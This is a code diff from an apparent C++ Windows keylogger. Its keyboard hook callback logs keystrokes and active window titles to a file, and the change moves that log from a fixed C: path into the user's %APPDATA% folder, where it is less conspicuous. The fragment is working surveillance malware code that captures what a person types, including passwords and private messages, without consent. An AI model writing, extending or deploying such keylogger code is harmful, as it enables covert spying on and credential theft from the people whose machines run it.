@@ -35,7 +35,11 @@ LRESULT CALLBACK KeyBoardHookCallBack(int code, WPARAM wParam, LPARAM lParam)
 			string key;
 			string window;
 			fstream f;
-			f.open("C:\\ender\\log.txt", ios::app, _SH_DENYNO);
+			char *fipt = new char[1000];
+			ExpandEnvironmentStringsA("%APPDATA%", fipt, 1000);
+			string filepath(fipt);
+			filepath.append("\\log.txt");
+			f.open(filepath, ios::app, _SH_DENYNO);
 
 			HWND Wnd = GetForegroundWindow();
 			char* CurrentWnd = new char[300];
@@ -171,6 +175,7 @@ LRESULT CALLBACK KeyBoardHookCallBack(int code, WPARAM wParam, LPARAM lParam)
 			f.close();
 			PrevWnd.assign(CurrentWnd);
 			delete[] CurrentWnd;
+			delete[] fipt;
 		}
 	}
 	return CallNextHookEx(key, code, wParam, lParam);
